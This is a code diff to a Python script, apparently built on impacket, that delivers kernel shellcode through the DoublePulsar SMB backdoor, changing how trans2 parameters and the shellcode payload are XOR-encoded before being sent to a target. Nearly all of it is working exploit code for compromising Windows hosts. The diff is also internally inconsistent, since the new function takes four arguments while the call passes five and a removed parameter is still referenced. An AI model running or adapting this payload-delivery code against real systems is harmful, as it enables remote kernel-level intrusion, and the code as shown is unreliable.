@@ -165,7 +165,7 @@ def send_trans2_ping(conn, tid):
 
 	conn.sendSMB(pkt)
 	
-def send_trans2_second(conn, tid, data, displacement):
+def send_trans2_second(conn, tid, xorkey, data):
 	pkt = smb.NewSMBPacket()
 	pkt['Tid'] = tid
 
@@ -194,9 +194,21 @@ def send_trans2_second(conn, tid, data, displacement):
 	transCommand['Parameters']['DataCount'] = len(data)
 	transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
 	transCommand['Parameters']['DataDisplacement'] = displacement
+	
+	#xor the parameters
+	#parameters are:
+	#DataCount ( total size of the shellcode )
+        #ChunkSize ( size of the shellcode chunk, or 4096 )
+        #Data Offset ( Offset of the data, starts at 0 and increments by 4096 chunk sizes)
+	transCommand['Parameters']['DataCount'] = xor_encrypt(len(data), xorkey)
+	#transCommand['Parameters']['DataOffset'] = xor_encrypt(fixedOffset + pad2Len, xorkey)
+	#transCommand['Parameters']['DataDisplacement'] = displacement
+	transCommand['Parameters']['Chunksize'] = xor_encrypt(len(data), xorkey)
+	transCommand['Parameters']['DataOffset'] = xor_encrypt(0x0000, xorkey)
 
+	#xor the payload data
 	transCommand['Data']['Trans_Parameters'] = ''
-	transCommand['Data']['Trans_Data'] = data
+	transCommand['Data']['Trans_Data'] = xor_encrypt(data, xorkey)
 	pkt.addCommand(transCommand)
 
 	conn.sendSMB(pkt)
@@ -233,13 +245,13 @@ if __name__ == "__main__":
     modified_kernel_shellcode += payload_shellcode
 
     #XOR parameters
-    xor_encrypt(parameters, key)
+    #xor_encrypt(parameters, key)
 
     #XOR memory buffer
-    xor_encrypt(modified_kernel_shellcode, key)
+    #xor_encrypt(modified_kernel_shellcode, key)
   
     #send doublePulsar exec packet
-    send_trans2_second(conn, tid, modified_kernel_shellcode, data_displacement_variable)
+    send_trans2_second(conn, tid, key, modified_kernel_shellcode, data_displacement_variable)
     recvPkt = conn.recvSMB()
     retStatus = recvPkt.getNTStatus()
 
